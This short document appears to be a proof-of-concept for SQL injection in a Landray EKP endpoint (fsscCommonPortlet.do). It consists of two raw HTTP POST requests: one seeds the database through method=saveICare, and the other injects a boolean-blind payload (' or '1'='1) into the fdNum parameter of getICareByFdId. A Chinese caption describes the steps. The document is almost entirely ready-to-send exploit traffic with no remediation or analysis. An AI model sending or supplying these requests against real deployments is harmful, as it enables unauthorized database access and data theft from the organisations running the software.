```http
POST /ekp/fssc/common/fssc_common_portlet/fsscCommonPortlet.do HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 76

method=saveICare&fdId=&fdNum=1&docSubject=1&fdName=test&createTime=1&fdStatus=1
```

填充数据库，布尔盲注：

```
POST /ekp/fssc/common/fssc_common_portlet/fsscCommonPortlet.do HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

method=getICareByFdId&fdNum=asdasd'+or+'1'='1&ordertype=down
```

